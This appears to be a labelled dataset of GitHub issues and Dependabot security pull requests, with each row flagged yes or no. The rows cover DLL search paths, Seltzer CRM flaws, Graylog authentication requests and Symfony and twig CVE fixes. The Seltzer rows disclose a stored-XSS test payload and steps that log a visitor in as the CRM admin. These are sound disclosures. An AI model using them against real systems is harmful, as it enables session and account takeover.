Given this, what is the correct way to customize the DLL search path before `main` is called?I believe it cannot be done.  Windows assumes that one does not run a program from a directory that also has untrusted files.It can be done with [manifest files](https://docs.microsoft.com/en-us/windows/win32/sbscs/assembly-manifests). The SxS cache will be checked before the application directory. However, I'm not sure if that can be done with system dlls. You can also set probing paths in an application [configuration file](https://docs.microsoft.com/en-us/windows/win32/sbscs/application-configuration-files#probing).
",no,"O-windows,C-enhancement,A-security,"
elplatt/seltzer,299982480,"Persistent Cross-Site Scripting","If you set the first name (or any other field) of a user's record to include <script>alert(1)</script> the application will alert 1 on any screen that username is shown. Likewise this can be used to redirect to another site and/or access cookies and other browser based activities. Output should be HTML encoded for any and all user supplied data.","Good catch!

I think the solution here is to implement a check_plain() function similar to drupal's and make sure it gets called on all user submitted data. I'll do this if I get time but could definitely use some help.",no,"Security,"
elplatt/seltzer,46355297,"Potential to hijack a logged-in user's session","Opened up chrome, like I normally do, typed in the URL to our CRM and was greeted with ""Welcome, Platt, Edward L.""

It appears to be fully logged in as someone else, with all of their permissions.  Could the server have hit a session ID collision or something?  Smells like a gaping security hole to me.  
","How widespread is this problem? Does it happen every time? Can you reproduce it in other browsers or computers?
It has only happened to me once so far, but I don't access the CRM often.
I was wondering if this has happened to anyone else.
On Oct 24, 2014 11:19 AM, ""Edward L Platt"" notifications@github.com wrote:

> How widespread is this problem? Does it happen every time? Can you
> reproduce it in other browsers or computers?
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/elplatt/seltzer/issues/338#issuecomment-60401856.
Looks like the CRM only checks the PHPSESSID cookie to auth users.  Since we have other sites on the same domain name, there are many ways that someone may be able to stick code in the right place (for example this comment on our blog: http://i3.lc/425) to steal an unsuspecting user's cookies.  
We ought to have some secondary check since it's well known that cookies can't be trusted.  
I know an IP address check isn't perfect, but it would be better than nothing.  
I have also randomly been logged in as Ed at one point. I don't have any data for how it happen. I'm pretty sure it was on my computer I use mostly for lan parties.  At the time I figured I must have had the  computer where Ed was some time in the past and he checked the crm on it and forgot to log out. 
This is obviously a serious bug. Can anyone think of a fix? Is there a
standard way to isolate php session variables between apps on the same
server?

On Fri, Dec 19, 2014 at 12:43 PM, NateLapT notifications@github.com wrote:

> I have also randomly been logged in as Ed at one point. I don't have any
> data for how it happen. I'm pretty sure it was on my computer I use mostly
> for lan parties. At the time I figured I must have had the computer where
> Ed was some time in the past and he checked the crm on it and forgot to log
> out.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/elplatt/seltzer/issues/338#issuecomment-67670892.

## 

Edward L. Platt
http://elplatt.com
http://civic.mit.edu/users/elplatt
http://i3detroit.com
@elplatt http://twitter.com/elplatt

This electronic mail message was sent from my desktop personal computer.
Please forgive any long-winded, overly-prosaic ramblings.
I've turned off access to the session cookie via javascript on our server, and I recommend others who use this cookie do the same.  That will at least make it more difficult to get at the session ID.
So is the problem that (possibly malicious) client-side code can set the
uid session variable to an arbitrary value? I didn't know js could modify
php session vars.

On Fri, Dec 19, 2014 at 1:04 PM, mjgardes notifications@github.com wrote:

> I've turned off access to the session cookie via javascript on our server,
> and I recommend others who use this cookie do the same. That will at least
> make it more difficult to get at the session ID.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/elplatt/seltzer/issues/338#issuecomment-67673801.

## 

Edward L. Platt
http://elplatt.com
http://civic.mit.edu/users/elplatt
http://i3detroit.com
@elplatt http://twitter.com/elplatt

This electronic mail message was sent from my desktop personal computer.
Please forgive any long-winded, overly-prosaic ramblings.
I think there are two closely related problems here.  The most dangerous
thing is we trust clients to not mess with their cookies, even though it's
trivial to do, for example with a browser extension.  JS anywhere on
i3detroit.org is just one of the ways an attacker might be able to get
their hands on a logged-in sesson variable.

The fact that multiple people have been ""accidentally"" logged in as cid 1
without even trying might be related.  For now I want to have that account
not be so privileged so if it happens again they'll at least get a
read-only account.

On Fri, Dec 19, 2014 at 1:09 PM, Edward L Platt notifications@github.com
wrote:

> So is the problem that (possibly malicious) client-side code can set the
> uid session variable to an arbitrary value? I didn't know js could modify
> php session vars.
> 
> On Fri, Dec 19, 2014 at 1:04 PM, mjgardes notifications@github.com
> wrote:
> 
> > I've turned off access to the session cookie via javascript on our
> > server,
> > and I recommend others who use this cookie do the same. That will at
> > least
> > make it more difficult to get at the session ID.
> > 
> > —
> > Reply to this email directly or view it on GitHub
> > https://github.com/elplatt/seltzer/issues/338#issuecomment-67673801.
> 
> ## 
> 
> Edward L. Platt
> http://elplatt.com
> http://civic.mit.edu/users/elplatt
> http://i3detroit.com
> @elplatt http://twitter.com/elplatt
> 
> This electronic mail message was sent from my desktop personal computer.
> Please forgive any long-winded, overly-prosaic ramblings.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/elplatt/seltzer/issues/338#issuecomment-67674395.
Steps to reproduce:
Navigate to ...payment/ipn.php
observe the pretty blank page
Navigate to /crm/
You are now Ed.
The problem here seems to be some scripts trying to log out with $_SESSION['userId'] = 0;.  Trouble is 0 is an actual user with all the permissions.  

Traditionally, the nobody user is -1 or -2, but I don't know what that will break in the CRM.
Admin user should be cid=1 and all others should be nonzero. This might be
an install-specific database inconsistency.

On Tue, Apr 14, 2015 at 12:07 PM, mjgardes notifications@github.com wrote:

> The problem here seems to be some scripts trying to log out with
> $_SESSION['userId'] = 0;. Trouble is 0 is an actual user with all the
> permissions.
> 
> Traditionally, the nobody user is -1 or -2, but I don't know what that
> will break in the CRM.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/elplatt/seltzer/issues/338#issuecomment-92936388.

## 

Edward L. Platt
http://elplatt.com
http://civic.mit.edu/users/elplatt
http://i3detroit.com
@elplatt http://twitter.com/elplatt

This electronic mail message was sent from my desktop personal computer.
Please forgive any long-winded, overly-prosaic ramblings.
",no,"Security,"
graylog-labs/graylog2-web-interface,32142868,"Feature request:  Non-user account access to dashboards","To make dashboards usable by appliances driving large, dedicated purpose displays such as televisions, they need to be accessible either anonymously, or via obfuscated URL's, or via ""token access"" (where the token is passed in as a GET variable in the URL.
",,no,"security,widgets,feature,"
graylog-labs/graylog2-web-interface,29973213,"Integrate with Google Apps login (OpenID)","We are currently using Google as our domain email and would like to take benefit of the OpenID authentication to login into Graylog2. Is openID plugin part of the roadmap?
","Not scheduled but definitely something to think about! :+1: 
+1
I don't think it's even possible to use Google Apps login without making Graylog accessible from the outside of your network (as far as I know Google needs a callback URL to complete the authentication). I think that would be a problem for most users.
What you have to define is the redirect IP or domain authorized but Google is not calling the callback it is just doing a 301 to the redirect URL. You do not need to expose this ip/url outside of your network.
We use Google Auth for Jenkins with an internal network ip without any issue
We use Google Auth for Jenkins as well. Would definitely be awesome to have this ability in graylog.
+1 on this! It's terrible to have to manage user access manually. Having Google Auth would solve this problem for us.
+1
+1
+1
+1
+
+1
+1
+1
:+1: 
It's possible to run google login (or any oauth2) when the system isn't accessible on the internet. The flow doesn't require a callback to the server. The server simply needs to be able to reach out to the oauth2 provider (or you can have the flow completely flow through the client).
+1
+1
Just a reminder that you can click on the new ""reaction"" feature instead of leaving all of these +1 comments. Quite a few of us are subscribed to this issue, so it results in a lot of needless emails.
please make this configurable so you can use any openid connect provider
will this be planned for any milestone?
@Ignitor We implemented pluggable authentication mechanisms in Graylog 2.1.0, so support for authentication via Google could be written as a plugin.

This being said, there are no concrete plans to write such a plugin from our side, but if you feel lucky, you can give it a shot.
Is this feature possible? Looking to implement this for my organisation.@jjegg Sure, you could implement this with a plugin.@joschi could you point me to an online resource so I can learn more about how I would create this plugin and integrate this? @jjegg http://docs.graylog.org/en/2.1/pages/plugins.html

We are using GitHub issues for tracking bugs in Graylog itself, but this doesn't look like one. Please post this issue to our [public mailing list](https://groups.google.com/forum/#!forum/graylog2) or join the [#graylog channel on freenode IRC](https://webchat.freenode.net/?channels=%23graylog).

Thank you!+1This is currently not on the roadmap, and for that reason closed. Note that you can write own authentication providers as a plugin to support Google Apps logins.",no,"security,users,feature,"
graylog-labs/graylog2-web-interface,28398456,"Remember me checkbox at the login page","How about provide something like «remember me» checkbox at the login page?
For now graylog web interface sets session cookie after successful login so I will need to relogin after browser restart.
Would be nice to provide option to make it persistent for 2 weeks for example.

If I remember correctly that's exactly how this was done in the previous (pink) interface.
",":+1: 

You can set the default session time in the user settings until we implement this.
Ah, thanks (note for those who also encounter this issue: you can set it only on user creation).
Cookie is still ""session cookie"" though.
",no,"security,users,feature,"
graylog-labs/graylog2-web-interface,25983795,"Integrate saved searches into the permission model","Only show saved searches for streams a reader user has access to.

Note that saved searches are not bound to streams yet. We need to store if a saved search was saved from a stream or not. - Still it should be executable on all messages or streams by non-reader users.
","+1 

It would be awesome to have the ability to clone saved searches as well - that way you could have a number of read-only searches that could be cloned (and modified) as and when needed ...
see #823 
",no,"security,users,feature,"
graylog-labs/graylog2-web-interface,29297334,"Authentication with X.509 Client Certificate on graylog2-web-interface","Hi,

authentication on graylog2-web-interface with client certificate would be a great feature.

Even the use of HTTP-Basic Auth would be great, so i can use a apache reverse proxy with authentication in front of an graylog2-web-interface.
","investigate what this would mean for interface->server authentication
",no,"security,users,feature,"
graylog-labs/graylog2-web-interface,32669595,"Feature Request: audit log for activity in Graylog2","In order to use Graylog in enterprise with Graylog storing sensitive log messages, one of the things I am missing is the ability to get an audit log for activities inside Graylog (i.e. who saw log messages and which ones).
","+1
Can you give a bit more information about where the audiot logs should be stored? Is writing that to a local file (like an access log) enough? Is writing it to Graylog2 fine, too? Does it have to be stored in some secure place?

I could need some advice on how people are using this in practice. :) Thanks!
Wasn't @kroepke playing with something for the API logs a while back, directly feeding them into graylog2 ?

I would prefer to have the audit log searchable from within graylog2 - once message signing is implemented it should provide enough confidence against possible manipulation.
The web interface can send its access log to graylog2, yes. I would need to
review which fields are already exposed, not sure the user is in there yet.
If so, then we would have most of what is necessary already, yes.

On Mon, May 5, 2014 at 3:48 PM, Henrik Johansen notifications@github.comwrote:

> Wasn't @kroepke https://github.com/kroepke playing with something for
> the API logs a while back, directly feeding them into graylog2 ?
> 
> I would prefer to have the audit log searchable from within graylog2 -
> once message signing is implemented it should provide enough confidence
> against possible manipulation.
> 
> —
> Reply to this email directly or view it on GitHubhttps://github.com/Graylog2/graylog2-web-interface/issues/772#issuecomment-42189223
> .
Greetings, is this issue still active? We would like to log when an admin permits a user to access a stream and when a user accesses a stream. Is this audited in some logfile?
R/Daniel
Couple notes:
- RestAccessLogFilter already implements audit logging for REST API
- RestAccessLogFilter is typically called by web interface, not the user. Logged IP is that of the web interface.
- RestAccessLogFilter is not able to handle X-Forwarded-For schemantics at this moment.
- The schemantics of the web interface and the REST API are not guaranteed to map 1:1 to each other. For example it is possible to show logs to user in the web interface, without causing a call to REST API. 

Also, this might interest someone:
https://github.com/mikkolehtisalo/mod_gllog
",no,"security,infrastructure,feature,"
graylog-labs/graylog2-web-interface,26256787,"Authenticate using REMOTE_USER from web application container","It would be great to be able to authenticate to Graylog2 using (e.g.) the REMOTE_USER variable filled in by Apache when a user authenticates using one of Apache's authentication models. This allows some single-sign-on implementations (e.g. using client certs or Kerberos) that would otherwise not be possible with username/password authentication.

I can expand on this by explaining our current setup with some of our other internal applications. With these, we run Apache with mod_auth_kerb installed, as the web server for the application. Apache mod_auth_kerb will try and authenticate users with SPNEGO, and then fill in the REMOTE_USER variable with the user's Kerberos principal. The web application then reads / trusts the REMOTE_USER variable from Apache and queries our LDAP server for info about the user's name, email and groups membership. We also use the SPNEGO support in [Tomcat](http://tomcat.apache.org/tomcat-7.0-doc/windows-auth-howto.html) for doing the same thing for servlet-based applications.

If Graylog2 could take the 'query LDAP using REMOTE_USER' approach that would be the best option, but also just taking the REMOTE_USER provided by Apache and logging in or creating a user in Graylog2's internal database (instead of querying LDAP) would be nice.
","Thank you! Scheduled for our ""post-0.20.0"" milestone. :)
+1

I was looking for something similar for myself. I'd suggest going one step further, though: our SSO systems (CAS) can also pass the name/email/etc attributes in as part of the request, without any connection to any LDAP server whatsoever. Just let me map the names of attributes to your fields, and I'll be a happy camper. (And you won't have to go back and query LDAP for it!)

For reference purposes, here's the Apache module: https://github.com/Jasig/mod_auth_cas
for a similar request see #713 
+1

We're using FreeIPA and I'd like to configure SSO. Currently it won't authenticate against FreeIPA's LDAP and SSO would be more preferable to that anyway.
Is there any progress?
:+1: 
Here is one attempt: https://github.com/mikkolehtisalo/grl-authen/tree/master

It's not a very working approach so I am **not** going to develop it further. The main reasons are that the REST API requires users' passwords, and the implementation breaks way too easy if something changes in Graylog and/or Play framework.

May I suggest, that given the apparent lack of resources compared to the requirements of implementing several kinds of authentication methods, Graylog should implement a re-usable access token service (specialized system level API) instead. 

It would make people requiring different methods (OAuth, Kerberos, SAML, CAS, TLS client certificates etc) to build their authentication on their own, and then based on that request for a token from a system service. The token (typically a ready-to-use cookie) could then proxied to the user. 
+1 nice!
+1

btw. first comment says ""Scheduled for our ""post-0.20.0"" milestone""
but it doesn't look scheduled at all... any updates?
will be made possible by https://github.com/Graylog2/graylog2-server/issues/2232
",no,"security,feature,"
miholeus/symphonia,444240221,"⬆️ 🔒 Bump twig/twig from 2.4.8 to 2.7.0","Bumps [twig/twig](https://github.com/twigphp/Twig) from 2.4.8 to 2.7.0. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>

*Sourced from [The PHP Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories/blob/master/twig/twig/2019-03-12.yaml).*

> **Sandbox Information Disclosure**
> 
> Affected versions: <1.38.0; >=2.0.0, <2.7.0

</details>
<details>
<summary>Changelog</summary>

*Sourced from [twig/twig's changelog](https://github.com/twigphp/Twig/blob/2.x/CHANGELOG).*

> * 2.7.0 (2019-03-12)
> 
>  * fixed sandbox security issue (under some circumstances, calling the
>    __toString() method on an object was possible even if not allowed by the
>    security policy)
>  * fixed batch filter clobbers array keys when fill parameter is used
>  * added preserveKeys support for the batch filter
>  * fixed ""embed"" support when used from ""template_from_string""
>  * deprecated passing a Twig\Template to Twig\Environment::load()/Twig\Environment::resolveTemplate()
>  * added the possibility to pass a TemplateWrapper to Twig\Environment::load()
>  * marked Twig\Environment::getTemplateClass() as internal (implementation detail)
>  * improved the performance of the sandbox
>  * deprecated the spaceless tag
>  * added a spaceless filter
>  * added max value to the ""random"" function
>  * deprecated Twig\Extension\InitRuntimeInterface
>  * deprecated Twig\Loader\ExistsLoaderInterface
>  * deprecated PSR-0 classes in favor of namespaced ones
>  * made namespace classes the default classes (PSR-0 ones are aliases now)
>  * added Twig\Loader\ChainLoader::getLoaders()
>  * removed duplicated directory separator in FilesystemLoader
>  * deprecated the ""base_template_class"" option on Twig\Environment
>  * deprecated the Twig\Environment::getBaseTemplateClass() and
>    Twig\Environment::setBaseTemplateClass() methods
>  * changed internal code to use the namespaced classes as much as possible
>  * deprecated Twig_Parser::isReservedMacroName()
> 
> * 2.6.2 (2019-01-14)
> 
>  * fixed regression (key exists check for non ArrayObject objects)
> 
> * 2.6.1 (2019-01-14)
> 
>  * fixed ArrayObject access with a null value
>  * fixed embedded templates starting with a BOM
>  * fixed using a Twig_TemplateWrapper instance as an argument to extends
>  * fixed error location when calling an undefined block
>  * deprecated passing a string as a source on Twig_Error
>  * switched generated code to use the PHP short array notation
>  * fixed float representation in compiled templates
>  * added a second argument to the join filter (last separator configuration)
> 
> * 2.6.0 (2018-12-16)
> 
>  * made sure twig_include returns a string
>  * fixed multi-byte UFT-8 in escape('html_attr')
>  * added the ""deprecated"" tag
>  * added support for dynamically named tests
>  * fixed GlobalsInterface extended class
>  * fixed filesystem loader throwing an exception instead of returning false
></tr></table> ... (truncated)
</details>
<details>
<summary>Commits</summary>

- [`57bd838`](https://github.com/twigphp/Twig/commit/57bd838bb7a9368ecf8b19bbe9788090502d1615) prepared the 2.7.0 release
- [`ad7d274`](https://github.com/twigphp/Twig/commit/ad7d27425dffc763644de93da2262f69478c691b) Merge branch '1.x' into 2.x
- [`0f3af98`](https://github.com/twigphp/Twig/commit/0f3af98ef6e71929ad67fb6e5f3ad65777c1c4c5) security [#2885](https://github-redirect.dependabot.com/twigphp/Twig/issues/2885) Fix security issue in the sandbox (fabpot)
- [`34cccc7`](https://github.com/twigphp/Twig/commit/34cccc77f077bccb546d5471d9f7d34541d21037) Merge branch '1.x' into 2.x
- [`5e1a361`](https://github.com/twigphp/Twig/commit/5e1a3615bceaa913babe38a116b7ca1a40598f44) removed one usage of Template vs TemplateWrapper
- [`eac5422`](https://github.com/twigphp/Twig/commit/eac5422956e1dcca89a3669a03a3ff32f0502077) fixed security issue in the sandbox
- [`0e583c9`](https://github.com/twigphp/Twig/commit/0e583c9ee1c5cbd6f1c3e0b28447fa85b3428eb7) updated CHANGELOG
- [`a73bcb4`](https://github.com/twigphp/Twig/commit/a73bcb4afe4393d4be9c7c424bdef42e19e78668) Merge branch '1.x' into 2.x
- [`7e30569`](https://github.com/twigphp/Twig/commit/7e305693b0bb212082fd19df808a949d8b0ed72d) bug [#2884](https://github-redirect.dependabot.com/twigphp/Twig/issues/2884) Fix ""batch filter clobbers array keys when fill parameter is used ""...
- [`750cb23`](https://github.com/twigphp/Twig/commit/750cb237421a2210b677c8ae1f23096ce407714b) fixed batch filter clobbers array keys when fill parameter is used
- Additional commits viewable in [compare view](https://github.com/twigphp/Twig/compare/v2.4.8...v2.7.0)
</details>
<br />

[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=twig/twig&package-manager=composer&previous-version=2.4.8&new-version=2.7.0)](https://dependabot.com/compatibility-score.html?dependency-name=twig/twig&package-manager=composer&previous-version=2.4.8&new-version=2.7.0)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot ignore this [patch|minor|major] version` will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)

Finally, you can contact us by mentioning @dependabot.

</details>",,yes,"dependencies,security,"
miholeus/symphonia,436451303,"⬆️ 🔒 Bump symfony/symfony from 3.4.23 to 3.4.26","Bumps [symfony/symfony](https://github.com/symfony/symfony) from 3.4.23 to 3.4.26. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>

*Sourced from [The PHP Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2019-10909.yaml).*

> **CVE-2019-10909: Escape validation messages in the PHP templating engine**
> 
> Affected versions: >=2.7.0, <2.7.51; >=2.8.0, <2.8.50; >=3.0.0, <3.1.0; >=3.1.0, <3.2.0; >=3.2.0, <3.3.0; >=3.3.0, <3.4.0; >=3.4.0, <3.4.26; >=4.0.0, <4.1.0; >=4.1.0, <4.1.12; >=4.2.0, <4.2.7

*Sourced from [The PHP Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2019-10911.yaml).*

> **CVE-2019-10911: Add a separator in the remember me cookie hash**
> 
> Affected versions: >=2.7.0, <2.7.51; >=2.8.0, <2.8.50; >=3.0.0, <3.1.0; >=3.1.0, <3.2.0; >=3.2.0, <3.3.0; >=3.3.0, <3.4.0; >=3.4.0, <3.4.26; >=4.0.0, <4.1.0; >=4.1.0, <4.1.12; >=4.2.0, <4.2.7

*Sourced from [The PHP Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2019-10913.yaml).*

> **CVE-2019-10913: Reject invalid HTTP method overrides**
> 
> Affected versions: >=2.7.0, <2.7.51; >=2.8.0, <2.8.50; >=3.0.0, <3.1.0; >=3.1.0, <3.2.0; >=3.2.0, <3.3.0; >=3.3.0, <3.4.0; >=3.4.0, <3.4.26; >=4.0.0, <4.1.0; >=4.1.0, <4.1.12; >=4.2.0, <4.2.7

*Sourced from [The PHP Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2019-10912.yaml).*

> **CVE-2019-10912: Prevent destructors with side-effects from being unserialized**
> 
> Affected versions: >=2.8.0, <2.8.50; >=3.0.0, <3.1.0; >=3.1.0, <3.2.0; >=3.2.0, <3.3.0; >=3.3.0, <3.4.0; >=3.4.0, <3.4.26; >=4.0.0, <4.1.0; >=4.1.0, <4.1.12; >=4.2.0, <4.2.7

*Sourced from [The PHP Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2019-10910.yaml).*

> **CVE-2019-10910: Check service IDs are valid**
> 
> Affected versions: >=2.7.0, <2.7.51; >=2.8.0, <2.8.50; >=3.0.0, <3.1.0; >=3.1.0, <3.2.0; >=3.2.0, <3.3.0; >=3.3.0, <3.4.0; >=3.4.0, <3.4.26; >=4.0.0, <4.1.0; >=4.1.0, <4.1.12; >=4.2.0, <4.2.7

</details>
<details>
<summary>Release notes</summary>

*Sourced from [symfony/symfony's releases](https://github.com/symfony/symfony/releases).*

> ## v3.4.26
> **Changelog** (since https://github.com/symfony/symfony/compare/v3.4.25...v3.4.26)
> 
>  * bug [#31084](https://github-redirect.dependabot.com/symfony/symfony/issues/31084) [HttpFoundation] Make MimeTypeExtensionGuesser case insensitive ([@&#8203;vermeirentony](https://github.com/vermeirentony))
>  * bug [#31142](https://github-redirect.dependabot.com/symfony/symfony/issues/31142) Revert ""bug [#30423](https://github-redirect.dependabot.com/symfony/symfony/issues/30423) [Security] Rework firewall's access denied rule (dimabory)"" ([@&#8203;chalasr](https://github.com/chalasr))
>  * security #cve-2019-10910 [DI] Check service IDs are valid ([@&#8203;nicolas](https://github.com/nicolas)-grekas)
>  * security #cve-2019-10909 [FrameworkBundle][Form] Fix XSS issues in the form theme of the PHP templating engine ([@&#8203;stof](https://github.com/stof))
>  * security #cve-2019-10912 [Cache][PHPUnit Bridge] Prevent destructors with side-effects from being unserialized ([@&#8203;nicolas](https://github.com/nicolas)-grekas)
>  * security #cve-2019-10911 [Security] Add a separator in the remember me cookie hash ([@&#8203;pborreli](https://github.com/pborreli))
>  * security #cve-2019-10913 [HttpFoundation] reject invalid method override ([@&#8203;nicolas](https://github.com/nicolas)-grekas)
> 
> [PR] [#31146](https://github-redirect.dependabot.com/symfony/symfony/pull/31146)
> [SECURITY] Security release
> 
> ## v3.4.25
> **Changelog** (since https://github.com/symfony/symfony/compare/v3.4.24...v3.4.25)
> 
>  * bug [#29944](https://github-redirect.dependabot.com/symfony/symfony/issues/29944) [DI] Overriding services autowired by name under _defaults bind not working ([@&#8203;przemyslaw](https://github.com/przemyslaw)-bogusz, [@&#8203;renanbr](https://github.com/renanbr))
>  * bug [#31076](https://github-redirect.dependabot.com/symfony/symfony/issues/31076) [HttpKernel] Fixed LoggerDataCollector crashing on empty file ([@&#8203;althaus](https://github.com/althaus))
>  * bug [#31071](https://github-redirect.dependabot.com/symfony/symfony/issues/31071) property normalizer should also pass format and context to isAllowedAttribute ([@&#8203;dbu](https://github.com/dbu))
>  * bug [#31059](https://github-redirect.dependabot.com/symfony/symfony/issues/31059) Show more accurate message in profiler when missing stopwatch ([@&#8203;linaori](https://github.com/linaori))
>  * bug [#30423](https://github-redirect.dependabot.com/symfony/symfony/issues/30423) [Security] Rework firewall's access denied rule ([@&#8203;dimabory](https://github.com/dimabory))
>  * bug [#31012](https://github-redirect.dependabot.com/symfony/symfony/issues/31012) [Process] Fix missing $extraDirs when open_basedir returns ([@&#8203;arsonik](https://github.com/arsonik))
>  * bug [#30907](https://github-redirect.dependabot.com/symfony/symfony/issues/30907) [Serializer] Respect ignored attributes in cache key of normalizer ([@&#8203;dbu](https://github.com/dbu))
>  * bug [#30085](https://github-redirect.dependabot.com/symfony/symfony/issues/30085) Fix TestRunner compatibility to PhpUnit 8 ([@&#8203;alexander](https://github.com/alexander)-schranz)
>  * bug [#30977](https://github-redirect.dependabot.com/symfony/symfony/issues/30977) [serializer] prevent mixup in normalizer of the object to populate ([@&#8203;dbu](https://github.com/dbu))
>  * bug [#30976](https://github-redirect.dependabot.com/symfony/symfony/issues/30976) [Debug] Fixed error handling when an error is already handled when another error is already handled (5) ([@&#8203;lyrixx](https://github.com/lyrixx))
>  * bug [#30979](https://github-redirect.dependabot.com/symfony/symfony/issues/30979) Fix the configurability of CoreExtension deps in standalone usage ([@&#8203;stof](https://github.com/stof))
>  * bug [#30918](https://github-redirect.dependabot.com/symfony/symfony/issues/30918) [Cache] fix using ProxyAdapter inside TagAwareAdapter ([@&#8203;dmaicher](https://github.com/dmaicher))
>  * bug [#30961](https://github-redirect.dependabot.com/symfony/symfony/issues/30961) [Form] fix translating file validation error message ([@&#8203;xabbuh](https://github.com/xabbuh))
>  * bug [#30951](https://github-redirect.dependabot.com/symfony/symfony/issues/30951) Handle case where no translations were found ([@&#8203;greg0ire](https://github.com/greg0ire))
>  * bug [#29800](https://github-redirect.dependabot.com/symfony/symfony/issues/29800) [Validator] Only traverse arrays that are cascaded into ([@&#8203;corphi](https://github.com/corphi))
>  * bug [#30921](https://github-redirect.dependabot.com/symfony/symfony/issues/30921) [Translator] Warm up the translations cache in dev ([@&#8203;tgalopin](https://github.com/tgalopin))
>  * bug [#30922](https://github-redirect.dependabot.com/symfony/symfony/issues/30922) [TwigBridge] fix horizontal spacing of inlined Bootstrap forms ([@&#8203;xabbuh](https://github.com/xabbuh))
>  * bug [#30895](https://github-redirect.dependabot.com/symfony/symfony/issues/30895) [Form] turn failed file uploads into form errors ([@&#8203;xabbuh](https://github.com/xabbuh))
>  * bug [#30919](https://github-redirect.dependabot.com/symfony/symfony/issues/30919) [Translator] Fix wrong dump for PO files ([@&#8203;deguif](https://github.com/deguif))
>  * bug [#30889](https://github-redirect.dependabot.com/symfony/symfony/issues/30889) [DependencyInjection] Fix a wrong error when using a factory ([@&#8203;Simperfit](https://github.com/Simperfit))
>  * bug [#30879](https://github-redirect.dependabot.com/symfony/symfony/issues/30879) [Form] Php doc fixes and cs + optimizations ([@&#8203;Jules](https://github.com/Jules) Pietri)
>  * bug [#30883](https://github-redirect.dependabot.com/symfony/symfony/issues/30883) [Console] Fix stty not reset when aborting in QuestionHelper::autocomplete() ([@&#8203;Simperfit](https://github.com/Simperfit))
>  * bug [#30878](https://github-redirect.dependabot.com/symfony/symfony/issues/30878) [Console] Fix inconsistent result for choice questions in non-interactive mode ([@&#8203;chalasr](https://github.com/chalasr))
> 
> [PR] [#31123](https://github-redirect.dependabot.com/symfony/symfony/pull/31123)
> 
> ## v3.4.24
> **Changelog** (since https://github.com/symfony/symfony/compare/v3.4.23...v3.4.24)
> 
>  * bug [#30660](https://github-redirect.dependabot.com/symfony/symfony/issues/30660) [Bridge][Twig] DebugCommand - fix escaping and filter ([@&#8203;SpacePossum](https://github.com/SpacePossum))
>  * bug [#30720](https://github-redirect.dependabot.com/symfony/symfony/issues/30720) Fix getSetMethodNormalizer to correctly ignore the attributes specified in ""ignored_attributes"" ([@&#8203;Emmanuel](https://github.com/Emmanuel) BORGES)
>  * bug [#30749](https://github-redirect.dependabot.com/symfony/symfony/issues/30749) [Serializer] Added check of constuctor modifiers to AbstractNormalizer ([@&#8203;NekaKawaii](https://github.com/NekaKawaii))
>  * bug [#30776](https://github-redirect.dependabot.com/symfony/symfony/issues/30776) [Routing] Fix routes annotation loading with glob pattern ([@&#8203;snoob](https://github.com/snoob))
></tr></table> ... (truncated)
</details>
<details>
<summary>Changelog</summary>

*Sourced from [symfony/symfony's changelog](https://github.com/symfony/symfony/blob/v3.4.26/CHANGELOG-3.4.md).*

> * 3.4.26 (2019-04-17)
> 
>  * bug [#31084](https://github-redirect.dependabot.com/symfony/symfony/issues/31084) [HttpFoundation] Make MimeTypeExtensionGuesser case insensitive (vermeirentony)
>  * bug [#31142](https://github-redirect.dependabot.com/symfony/symfony/issues/31142) Revert ""bug [#30423](https://github-redirect.dependabot.com/symfony/symfony/issues/30423) [Security] Rework firewall's access denied rule (dimabory)"" (chalasr)
>  * security #cve-2019-10910 [DI] Check service IDs are valid (nicolas-grekas)
>  * security #cve-2019-10909 [FrameworkBundle][Form] Fix XSS issues in the form theme of the PHP templating engine (stof)
>  * security #cve-2019-10912 [Cache][PHPUnit Bridge] Prevent destructors with side-effects from being unserialized (nicolas-grekas)
>  * security #cve-2019-10911 [Security] Add a separator in the remember me cookie hash (pborreli)
>  * security #cve-2019-10913 [HttpFoundation] reject invalid method override (nicolas-grekas)
> 
> * 3.4.25 (2019-04-16)
> 
>  * bug [#29944](https://github-redirect.dependabot.com/symfony/symfony/issues/29944) [DI] Overriding services autowired by name under _defaults bind not working (przemyslaw-bogusz, renanbr)
